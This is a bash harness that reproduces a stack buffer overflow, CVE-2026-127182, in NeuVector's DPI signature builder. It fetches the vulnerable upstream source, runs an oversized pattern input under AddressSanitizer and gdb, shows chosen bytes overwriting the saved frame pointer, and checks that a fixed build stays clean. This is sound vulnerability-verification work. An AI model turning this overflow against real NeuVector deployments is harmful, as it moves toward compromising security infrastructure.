#!/usr/bin/env bash
# One-command replay for the real-object lane of CVE-2026-127182.
# Compiles the BYTE-IDENTICAL pinned dp/dpi/sig/dpi_sig.c against the real
# NeuVector 5.5.x headers (third-party opaque types shimmed), drives it with
# a real dpi_dlpbld_t/pattern layout from dp/ctrl.c, and asserts ASan,
# fixed/safe controls and the plain-frame chosen-byte readback.
set -u
cd "$(dirname "$0")"
pass=0; fail=0
ok()  { echo "PASS $1"; pass=$((pass+1)); }
bad() { echo "FAIL $1"; fail=$((fail+1)); }
has() { grep -q -- "$2" "$1" 2>/dev/null; }
hasnt() { ! grep -q -- "$2" "$1" 2>/dev/null; }

ROOT=$(readlink -f ../src/real/neuvector-48ae8b5cac5ec3a7e332e5272e9b3050f44396cb)
FIXED=$(readlink -f ../src/dpi_sig-fixed.c)
DRIVER=$(pwd)/driver.c
OUT=$(pwd)/out

echo "== provisioning (if needed) =="
if [ ! -f "$ROOT/dp/dpi/sig/dpi_sig.c" ]; then
    mkdir -p ../src/real
    if [ ! -f ../src/real/neuvector-vuln.tar.gz ]; then
        curl -fsSL --max-time 180 \
          https://codeload.github.com/neuvector/neuvector/tar.gz/48ae8b5cac5ec3a7e332e5272e9b3050f44396cb \
          -o ../src/real/neuvector-vuln.tar.gz || {
            echo "FAIL provisioning fetch"; echo "TOTAL: $pass PASS / $((fail+1)) FAIL"; exit 1; }
    fi
    tar xzf ../src/real/neuvector-vuln.tar.gz -C ../src/real || {
        echo "FAIL provisioning extract"; echo "TOTAL: $pass PASS / $((fail+1)) FAIL"; exit 1; }
fi
mkdir -p out
INC="-I$(dirname "$ROOT")/shim -I$ROOT -I$ROOT/dp -include stdio.h -include $ROOT/base.h -include $ROOT/defs.h"
SAN="-g -O0 -fsanitize=address -fno-omit-frame-pointer -fno-stack-protector"
PLAIN="-g -O0 -fno-stack-protector -fno-omit-frame-pointer"
export ASAN_OPTIONS=detect_leaks=0:abort_on_error=0

echo "== source integrity =="
[ "$(sha256sum "$ROOT/dp/dpi/sig/dpi_sig.c" | cut -d' ' -f1)" = \
  1fbf0ba4aa731f8a92801002d2fe39141c2a88ea9a96d18507af47ae3303072b ] && \
    ok "real source byte-identical to pinned vulnerable file" || bad "real source byte-identical to pinned vulnerable file"
[ "$(sha256sum ../src/real/neuvector-vuln.tar.gz | cut -d' ' -f1)" = \
  8827c5f0de017392563119ac0f39429192c4233ccc150783e421f8c720148287 ] && \
    ok "upstream tree tarball hash" || bad "upstream tree tarball hash"

echo "== build/link =="
(cd "$ROOT" && gcc $SAN $INC -c dp/dpi/sig/dpi_sig.c -o "$OUT/real-vuln-asan.o") && ok "real vulnerable ASan object" || bad "real vulnerable ASan object"
(cd "$ROOT" && gcc $SAN $INC -x c -c "$FIXED" -o "$OUT/real-fixed-asan.o") && ok "real fixed ASan object" || bad "real fixed ASan object"
(cd "$ROOT" && gcc $PLAIN $INC -c dp/dpi/sig/dpi_sig.c -o "$OUT/real-vuln-plain.o") && ok "real vulnerable plain object" || bad "real vulnerable plain object"
gcc $SAN $INC -o out/asan-vuln out/real-vuln-asan.o "$DRIVER" && ok "link asan-vuln" || bad "link asan-vuln"
gcc $SAN $INC -o out/asan-fixed out/real-fixed-asan.o "$DRIVER" && ok "link asan-fixed" || bad "link asan-fixed"
gcc $PLAIN $INC -o out/plain-vuln out/real-vuln-plain.o "$DRIVER" && ok "link plain-vuln" || bad "link plain-vuln"

echo "== runs =="
out/asan-vuln 8 511  > out/asan-attack.log 2>&1 || true
out/asan-vuln 1 8    > out/asan-safe.log 2>&1 || true
out/asan-fixed 8 511 > out/fixed-attack.log 2>&1 || true
out/asan-fixed 1 8   > out/fixed-safe.log 2>&1 || true
out/plain-vuln 1 8   > out/plain-safe.log 2>&1 || true

echo "== real-object ASan attack: 8 patterns x 511 bytes into 2048 buffer =="
has out/asan-attack.log "AddressSanitizer: stack-buffer-overflow" && ok "real ASan stack overflow" || bad "real ASan stack overflow"
has out/asan-attack.log "WRITE of size 518" && ok "real ASan WRITE of size 518" || bad "real ASan WRITE of size 518"
has out/asan-attack.log "offset 2080 overflows this variable" && ok "real write 0 bytes past dlpsig_buf" || bad "real write 0 bytes past dlpsig_buf"
has out/asan-attack.log "'dlpsig_buf' (line 621)" && ok "real ASan names pinned real stack buffer" || bad "real ASan names pinned real stack buffer"
has out/asan-attack.log "dpi_sig_bld dp/dpi/sig/dpi_sig.c:658" && ok "real ASan write frame is upstream sprintf" || bad "real ASan write frame is upstream sprintf"
has out/plain-safe.log "REAL_DRIVER rc=0" && ok "plain safe input completes" || bad "plain safe input completes"

echo "== controls =="
hasnt out/asan-safe.log "AddressSanitizer: stack-buffer-overflow" && ok "vulnerable body ASan-clean on safe input" || bad "vulnerable body ASan-clean on safe input"
has out/asan-safe.log "REAL_DRIVER rc=0" && ok "vulnerable safe input rc=0" || bad "vulnerable safe input rc=0"
hasnt out/fixed-attack.log "AddressSanitizer" && ok "fixed real source ASan-clean on attack" || bad "fixed real source ASan-clean on attack"
has out/fixed-attack.log "REAL_DRIVER rc=0" && ok "fixed real source skips/rejects attack" || bad "fixed real source skips/rejects attack"
hasnt out/fixed-safe.log "AddressSanitizer" && ok "fixed real source ASan-clean on safe input" || bad "fixed real source ASan-clean on safe input"

echo "== plain real frame readback =="
gdb -q -batch \
    -ex 'break dp/dpi/sig/dpi_sig.c:662' \
    -ex 'run 8 511' \
    -ex 'printf "BUF=%p RBP=%p\n", &dlpsig_buf[0], $rbp' \
    -ex 'x/16xb &dlpsig_buf[2048]' \
    -ex 'x/4gx $rbp' \
    --args ./out/plain-vuln 8 511 > out/gdb-real.log 2>&1 || true
grep -A1 '0x.*:.*0x4d' out/gdb-real.log | head -2 > out/gdb-canary-real.log || true
[ "$(grep -o '0x4d' out/gdb-canary-real.log | wc -l)" -ge 8 ] && \
    ok "chosen 0x4d bytes past real 2048-byte buffer" || bad "chosen 0x4d bytes past real 2048-byte buffer"
has out/gdb-real.log "RBP=" && ok "real frame layout captured (BUF->RBP = 2080 bytes)" || bad "real frame layout captured (BUF->RBP = 2080 bytes)"
grep -qE '^0x[0-9a-f]+:.*0x[0-9a-f]*4d4d4d4d4d4d' out/gdb-real.log && \
    ok "chosen bytes overwrite saved RBP in real frame" || bad "chosen bytes overwrite saved RBP in real frame"

echo "TOTAL: $pass PASS / $fail FAIL"
[ "$fail" -eq 0 ]
